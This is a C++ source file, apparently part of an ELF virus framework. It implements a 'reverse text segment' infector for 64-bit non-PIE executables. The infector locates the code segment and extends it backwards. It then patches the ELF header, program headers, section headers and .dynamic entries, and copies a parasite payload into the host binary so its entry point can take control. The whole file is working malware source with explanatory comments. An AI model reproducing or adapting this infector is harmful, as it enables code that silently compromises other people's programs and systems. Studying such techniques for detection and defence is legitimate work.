#include "infector/reverse_text_infector.hh"
#include <elf.h>
#include "common/math.hh"
#include "common/mmap_min_addr.hh"
#include "nostdlib/stdio.hh"
#include "nostdlib/string.hh"

namespace vf::infector {
namespace {
void patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr,
               size_t padded_virus_size,
               Elf64_Off original_code_segment_file_offset,
               Elf64_Addr original_code_segment_p_vaddr) {
  // Point shdr (Pointer to iterate over SHT)
  auto section_entry_start = &shdr;

  for (auto cur_entry = section_entry_start;
       cur_entry < section_entry_start + ehdr.e_shnum; ++cur_entry) {
    if (cur_entry->sh_type == SHT_NULL) {
      continue;
    }
    // Shift file offset for sections to accommodate virus
    if (cur_entry->sh_offset >= original_code_segment_file_offset) {
      cur_entry->sh_offset += padded_virus_size;
    }
    // Shift V Address
    if (cur_entry->sh_addr &&
        cur_entry->sh_addr <= original_code_segment_p_vaddr) {
      cur_entry->sh_addr -= padded_virus_size;
    }
  }
}

// On some arch, the CODE segment would map from the start of the elf (aarch64)
// which results in less LOAD entries. But some would have multiple LOAD entries
// preceding CODE, and only map what's necessary to have execution bit (x86).
// for example:
//    Type Offset   VirtAddr            FileSiz           Flg
//    LOAD 0x000000 0x0000000000400000  0x002518  R   0x1000
//    LOAD 0x003000 0x0000000000403000  0x0573f1  RE  0x1000 <-- CODE
//    LOAD 0x05b000 0x000000000045b000  0x0844d0  R   0x1000
//    LOAD 0x0dfb00 0x00000000004e0b00  0x002550  RW  0x1000
// Since we must insert virus to the beginning of CODE, the virus insertion
// offset is the original CODE start offset, and all phdr entry offsets after
// CODE will be shifted back. All entries before and including CODE must shift
// vaddr forward.
//
//    LOAD 0x000000 0x0000000000400000  0x0d2910  RE  0x10000 <-- CODE
//    LOAD 0x0d2910 0x00000000004e2910  0x002d18  RW  0x10000
// In this example, the CODE starts from the beginning, including the ehdr and
// phdr We need to leave elf header intact and therefore, the virus must be
// inserted after ehdr but before the phdr, and all phdr entry offsets after
// CODE will be shifted back.
//
void patch_phdr(const Elf64_Ehdr& ehdr, Elf64_Phdr& phdr,
                uint64_t padded_virus_size,
                Elf64_Off original_code_segment_file_offset,
                Elf64_Addr original_code_segment_p_vaddr,
                size_t code_segment_idx) {
  auto pht_entry_count = ehdr.e_phnum;

  // Point to first phdr
  auto phdr_entry = &phdr;
  // For other entries that has p_offset after CODE segment, shift them.
  for (size_t idx = 0; idx < pht_entry_count; idx++) {
    auto cur_entry = phdr_entry + idx;
    // Shift file offset for all segments that are after and including CODE.
    if (cur_entry->p_offset > original_code_segment_file_offset) {
      cur_entry->p_offset += padded_virus_size;
    }

    // Shift vaddr for all segments that are before and including CODE.
    if (cur_entry->p_vaddr <= original_code_segment_p_vaddr) {
      if (cur_entry->p_vaddr) {
        cur_entry->p_vaddr -= padded_virus_size;
      }
      if (cur_entry->p_paddr) {
        cur_entry->p_paddr -= padded_virus_size;
      }
    }

    if (idx == code_segment_idx) {
      // extending CODE segment backwards.
      cur_entry->p_filesz += padded_virus_size;
      cur_entry->p_memsz += padded_virus_size;
    }
  }
}

void patch_ehdr(Elf64_Ehdr& ehdr, Elf64_Addr original_code_segment_p_vaddr,
                Elf64_Off original_code_segment_file_offset,
                uint64_t padded_virus_size) {
  // section header always comes after the virus.
  ehdr.e_shoff += padded_virus_size;

  if (original_code_segment_file_offset == 0) {
    // This means CODE starts from offset 0 and virus is inserted after ehdr but
    // before phdr. otherwise, virus is inserted after phdr.
    ehdr.e_phoff += padded_virus_size;
  }
}

bool does_entry_contain_address(Elf64_Xword tag) {
  // https://codebrowser.dev/glibc/glibc/elf/elf.h.html
  // https://docs.oracle.com/cd/E23824_01/html/819-0690/chapter6-42444.html
  return (tag >= DT_PLTGOT && tag <= DT_RELA) || tag == DT_INIT ||
         tag == DT_FINI || tag == DT_REL || tag == DT_DEBUG ||
         tag == DT_JMPREL || tag == DT_INIT_ARRAY || tag == DT_FINI_ARRAY ||
         tag == DT_ENCODING ||
         (tag >= DT_ADDRRNGLO && tag <= DT_ADDRRNGHI)  // this range uses d_ptr
         || tag == DT_VERDEF || tag == DT_VERNEED ||
         tag == DT_VERSYM;  // sun extension
}

// The dynamic section is generated if the host participates in dynamic linking
// and it includes various information to support it. For example, the
// DT_GNU_HASH entry for fast symbol lookup, which points to the starting vaddr
// of the .gnu.hash section, if moved forwarded to accommodate our virus, must
// be patched accordingly. This function searches through all entries in
// .dynamic section and shift those pointers forward if they have a smaller
// vaddr than the firs byte of CODE (where we insert the virus).
void patch_dynamic(std::span<std::byte> host_mapping, const Elf64_Ehdr& ehdr,
                   const Elf64_Shdr& shdr,
                   Elf64_Off original_code_segment_file_offset,
                   Elf64_Addr original_code_segment_p_vaddr,
                   uint64_t padded_virus_size) {
  if (original_code_segment_file_offset == 0) {
    // if there is no vaddr adjustment to gnu hash section, skip.
    return;
  }

  auto section_entry_start = &shdr;

  for (auto cur_entry = section_entry_start;
       cur_entry < section_entry_start + ehdr.e_shnum; ++cur_entry) {
    if (cur_entry->sh_type == SHT_DYNAMIC) {
      auto* dynamic_section_entry =
          reinterpret_cast<Elf64_Dyn*>(&host_mapping[cur_entry->sh_offset]);
      // look at all entries in .dynamic section until the last DT_NULL is
      // reached. If the entry is an address and is smaller than CODE start, we
      // have shifted it forward. Adjust values here.
      // Debug with: readelf -dW
      while (dynamic_section_entry->d_tag != DT_NULL) {
        if (does_entry_contain_address(dynamic_section_entry->d_tag)) {
          if (dynamic_section_entry->d_un.d_ptr <
              original_code_segment_p_vaddr) {
            dynamic_section_entry->d_un.d_ptr -= padded_virus_size;
          }
        }
        dynamic_section_entry++;
      }
      return;
    }
  }
}

// This function is a bit involved, please see comments in header why we are
// doing this.
// |Elf Header|============|      virus       |=============| original CODE
//            | padding    |page  |page  |page  | padding   |page
size_t inject_virus(std::span<std::byte> host_mapping,
                    std::span<const std::byte> parasite_mapping,
                    const Elf64_Ehdr& ehdr, uint64_t padded_virus_size,
                    Elf64_Off original_code_segment_file_offset) {
  // The real file offset of the virus starting point so we can patch ehdr with.
  Elf64_Addr real_virus_start_offset = 0;
  // The virus plus padding both before and after.
  Elf64_Addr padded_virus_insert_offset = 0;
  // The extra padding in front of the virus.
  auto extra = original_code_segment_file_offset == 0 ? 4096 : 0;
  if (original_code_segment_file_offset == 0) {
    // The padded virus will be inserted after the elf header because that is
    // the one thing we can't shift.
    padded_virus_insert_offset = sizeof(Elf64_Ehdr);
    // However, we insert extra padding before the virus to make the real virus
    // start at a page aligned address.
    real_virus_start_offset = extra;
  } else {
    // This happens when we have a non-CODE segment preceding CODE segment. Our
    // virus code is always page aligned.
    padded_virus_insert_offset = original_code_segment_file_offset;
    real_virus_start_offset = padded_virus_insert_offset;
  }

  // Shift old content back.
  vf::memcpy(
      &host_mapping[padded_virus_insert_offset + padded_virus_size],
      &host_mapping[padded_virus_insert_offset],
      host_mapping.size() - padded_virus_size - padded_virus_insert_offset);
  // Clear old content. Not required.
  vf::memset(&host_mapping[padded_virus_insert_offset], 0x00,
             padded_virus_size);

  // Inject the virus. Make sure use the real virus offset to skip the padding.
  vf::memcpy(&host_mapping[real_virus_start_offset], parasite_mapping.data(),
             parasite_mapping.size());

  return real_virus_start_offset;
}

}  // namespace

std::optional<InjectionResult> ReverseTextInfector::inject(
    std::span<std::byte> host_mapping,
    std::span<const std::byte> parasite_mapping) {
  const auto& ehdr = reinterpret_cast<const Elf64_Ehdr&>(host_mapping.front());

  {
    const auto& shdr =
        reinterpret_cast<const Elf64_Shdr&>(host_mapping[ehdr.e_shoff]);
    // Patch .dynamic section if we touched .gnu.hash
    patch_dynamic(host_mapping, ehdr, shdr, original_code_segment_file_offset_,
                  original_code_segment_p_vaddr_, padded_virus_size_);
  }

  {
    auto& mutable_phdr =
        reinterpret_cast<Elf64_Phdr&>(host_mapping[ehdr.e_phoff]);
    patch_phdr(ehdr, mutable_phdr, padded_virus_size_,
               original_code_segment_file_offset_,
               original_code_segment_p_vaddr_, code_segment_idx_);
  }

  {
    auto& mutable_shdr =
        reinterpret_cast<Elf64_Shdr&>(host_mapping[ehdr.e_shoff]);
    patch_sht(ehdr, mutable_shdr, padded_virus_size_,
              original_code_segment_file_offset_,
              original_code_segment_p_vaddr_);
  }

  {
    // Patch elf header last
    auto& mutable_ehdr = reinterpret_cast<Elf64_Ehdr&>(host_mapping.front());
    patch_ehdr(mutable_ehdr, original_code_segment_p_vaddr_,
               original_code_segment_file_offset_, padded_virus_size_);
  }

  // We have inserted padding and the virus, but all we care about is the real
  // virus offset so we can redirect control flow back.
  auto virus_real_start_offset =
      inject_virus(host_mapping, parasite_mapping, ehdr, padded_virus_size_,
                   original_code_segment_file_offset_);

  return InjectionResult{
      .parasite_entry_address = parasite_load_address_,
      .parasite_file_offset = virus_real_start_offset,
  };
}

bool ReverseTextInfector::analyze(std::span<const std::byte> host_mapping,
                                  std::span<const std::byte> parasite_mapping) {
  host_size_ = host_mapping.size();
  parasite_size_ = parasite_mapping.size();

  const auto& ehdr = reinterpret_cast<const Elf64_Ehdr&>(host_mapping.front());

  // this algorithm only supports non-pie
  if (ehdr.e_type != ET_EXEC || ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
    return false;
  }

  const auto& phdr =
      reinterpret_cast<const Elf64_Phdr&>(host_mapping[ehdr.e_phoff]);

  original_e_entry_ = ehdr.e_entry;
  // Point to first entry in PHT
  const Elf64_Phdr* phdr_entry = &phdr;

  // Parse PHT entries
  for (size_t i = 0; i < ehdr.e_phnum; ++i, ++phdr_entry) {
    // Find the CODE Segment (containing RX section)
    if (phdr_entry->p_type == PT_LOAD && phdr_entry->p_flags == (PF_R | PF_X)) {
      code_segment_idx_ = i;
      original_code_segment_p_vaddr_ = phdr_entry->p_vaddr;
      original_code_segment_file_offset_ = phdr_entry->p_offset;

      auto extra_padding = original_code_segment_file_offset_ == 0 ? 4096 : 0;
      padded_virus_size_ =
          common::round_up_to(padded_virus_size_, 4096) + extra_padding;

      parasite_load_address_ =
          original_code_segment_p_vaddr_ - padded_virus_size_;

      if (parasite_load_address_ < common::mmap_min_addr()) {
        // cannot reverse extend anymore.
        return false;
      }

      if (original_code_segment_file_offset_ == 0) {
        // Because we need to accommodate the elf header, the virus has padding
        // before it. The real entry is one page after the originally planned
        // vaddr in order to make the virus page aligned and rodata relocation
        // safe.
        parasite_load_address_ += 4096;
      }
      return true;
    }
  }

  // no CODE segment found.
  return false;
}

size_t ReverseTextInfector::injected_host_size() {
  // See comments in header.
  return host_size_ + padded_virus_size_;
}

}  // namespace vf::infector